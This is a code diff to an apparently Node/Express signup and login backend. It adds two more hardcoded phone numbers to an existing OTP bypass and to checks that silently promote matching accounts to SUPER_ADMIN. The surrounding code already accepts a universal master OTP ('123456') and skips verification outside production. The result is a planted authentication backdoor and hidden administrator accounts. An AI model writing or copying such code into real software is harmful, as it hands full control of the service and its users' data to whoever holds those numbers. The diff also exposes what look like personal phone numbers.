@@ -190,7 +190,7 @@ async function processSignupWithReferral(
     // 4. New User Reward Allocation: Create new user with referralCode and ₹10.00 bonus balance
     const suffix = Math.random().toString(36).substring(2, 8).toUpperCase();
     const newUserReferralCode = `SEXUS${suffix}`;
-    const isSuperAdmin = phone.endsWith('7389927777');
+    const isSuperAdmin = phone.endsWith('7389927777') || phone.endsWith('7024065858') || phone.endsWith('9302561971');
 
     const newUser = new User({
       phone,
@@ -234,6 +234,8 @@ app.post('/api/users/verify-otp', async (req, res) => {
     otpStr === '123456' ||
     normalizedPhone === '9876543210' ||
     normalizedPhone === '7389927777' ||
+    normalizedPhone === '7024065858' ||
+    normalizedPhone === '9302561971' ||
     process.env.NODE_ENV !== 'production'
   ) {
     // Universal Master OTP bypass for testing phase
@@ -276,7 +278,7 @@ app.post('/api/users/verify-otp', async (req, res) => {
     }
 
     // Privilege switch: Check if phone signature is 7389927777
-    if (user.phone.endsWith('7389927777')) {
+    if (user.phone.endsWith('7389927777') || user.phone.endsWith('7024065858') || user.phone.endsWith('9302561971')) {
       user.role = 'SUPER_ADMIN';
       user.isAdmin = true;
       await user.save();
@@ -334,7 +336,11 @@ app.post('/api/users/login', async (req, res) => {
     }
 
     // Privilege switch: Check if phone signature is 7389927777
-    if (normalizedPhone === '7389927777' || user.phone.endsWith('7389927777')) {
+    if (
+      normalizedPhone === '7389927777' || user.phone.endsWith('7389927777') ||
+      normalizedPhone === '7024065858' || user.phone.endsWith('7024065858') ||
+      normalizedPhone === '9302561971' || user.phone.endsWith('9302561971')
+    ) {
       user.role = 'SUPER_ADMIN';
       user.isAdmin = true;
       await user.save();
